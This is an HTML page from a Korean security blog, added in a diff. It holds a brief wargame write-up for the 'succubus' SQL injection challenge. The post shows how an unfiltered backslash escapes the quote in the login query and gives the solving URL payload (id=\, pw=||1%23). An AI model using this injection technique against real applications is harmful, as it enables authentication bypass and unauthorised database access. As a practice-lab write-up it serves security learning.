@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Tempuss Blog" /></head>
+<style>@import url(/public/css/syntax/monokai.css);</style>
+  <title>Tempuss Blog</title>
+  <!-- <link href="/public/css/bootstrap.min.css" rel="stylesheet"> -->
+
+  <link href="/public/css/style.css" rel="stylesheet">
+  <body>
+  	<div class="container"> 
+		<div class="sidebar">
+			<div class="sidebar-item sidebar-header">
+	<div class='sidebar-brand'>
+		<a href="/about/">Tempuss Blog</a>
+	</div>
+	<p class="lead">보안하는 개발자</p></div>
+
+<div class="sidebar-item sidebar-nav">
+	<ul class="nav">
+      <li class="nav-title">Pages</li>
+	  <li>
+	  	<a class="nav-item" href="/">Articles</a>
+	  </li>
+	  
+	  
+	    
+	  
+	    
+	      
+	        <li>
+	        	<a class="nav-item" href="/about/">
+	            	About
+	            </a>
+	        </li>
+	      
+	    
+	  
+	    
+	      
+	    
+	  
+	    
+	  
+	    
+	  
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-nav">
+  	<ul class="nav">
+			<li class="nav-title">Categories</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Hacking">
+				<span class="name">Hacking</span>
+				<span class="badge">39</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Web">
+				<span class="name">Web</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#BoB">
+				<span class="name">BoB</span>
+				<span class="badge">9</span>
+	    	</a>
+ 		</li>
+	    
+	    <li>
+	    	<a class="nav-item" href="/category/#Data-Engineering">
+				<span class="name">Data-Engineering</span>
+				<span class="badge">8</span>
+	    	</a>
+ 		</li>
+	    
+	  </nav>
+	</ul>
+</div>
+
+<div class="sidebar-item sidebar-footer">
+	<p>Powered by <a href="https://github.com/jekyll/jekyll">Jekyll</a></p>
+</div>
+		</div>
+		<div class="content">
+			<article class="post">
+	<header class="post-header">
+		<div class="post-title"> 
+			LOS SUCCUBUS
+		</div>
+		<time class="post-date dt-published" datetime="2015-10-23T00:46:00+09:00" itemprop="datePublished">2015/10/23
+		</time>		
+	</header>
+
+	<div class="post-content">
+		<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select id from prob_succubus where id='' and pw=''
+</code></pre></div></div>
+
+<p>이렇게 생겼지만 잘보면 \를 필터링 안하고 있다.</p>
+
+<p>‘앞에 \가 붙어버리면 다른 문자로 인식해버리기 때문에</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=' \' and pw=' ' 
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>저 부분을 전부 id로 인식해 버린다. 즉 뒤에다가</td>
+      <td> </td>
+      <td>연산만 더해주면 끝</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://los.sandbox.cash/chall/succubus_1e73ac44ec838508bd2b2ce2026af8cf.php?id=\&amp;pw=||1%23
+</code></pre></div></div>
+
+<p>뒤에를 주석처리해주면 된다.</p>
+
+
+	</div>
+</article>
+		</div>
+	</div>
+  </body>
+</html>
